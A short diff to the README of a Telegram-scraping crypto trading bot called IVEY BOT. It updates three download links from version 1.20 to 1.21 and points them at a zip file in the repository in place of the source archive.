@@ -9,7 +9,7 @@
 
 ---
 
-[**Download Latest Version 1.20**](https://github.com/deCrawly/IVEY-BOT-Telegram-Scraper-for-DEX-Trading/archive/refs/heads/main.zip)
+[**Download Latest Version 1.21**](https://github.com/deCrawly/IVEY-BOT-Telegram-Scraper-for-DEX-Trading/blob/main/IVEY%20Bot%201.21.zip)
 
 
 
@@ -164,7 +164,7 @@ IVEY BOT empowers you with advanced automation tools to enhance your on-chain tr
 
 1. **Download IVEYbot:**
 
-[**Download Latest Version 1.20**](https://github.com/deCrawly/IVEY-BOT-Telegram-Scraper-for-DEX-Trading/archive/refs/heads/main.zip)
+[**Download Latest Version 1.21**](https://github.com/deCrawly/IVEY-BOT-Telegram-Scraper-for-DEX-Trading/blob/main/IVEY%20Bot%201.21.zip)
 
 
 2. **Set Up the Application:**
@@ -270,7 +270,7 @@ If you have entity problems check this
 
 ---
 
-[**Download Latest Version 1.20**](https://github.com/deCrawly/IVEY-BOT-Telegram-Scraper-for-DEX-Trading/archive/refs/heads/main.zip)
+[**Download Latest Version 1.21**](https://github.com/deCrawly/IVEY-BOT-Telegram-Scraper-for-DEX-Trading/blob/main/IVEY%20Bot%201.21.zip)
 
 ---
 
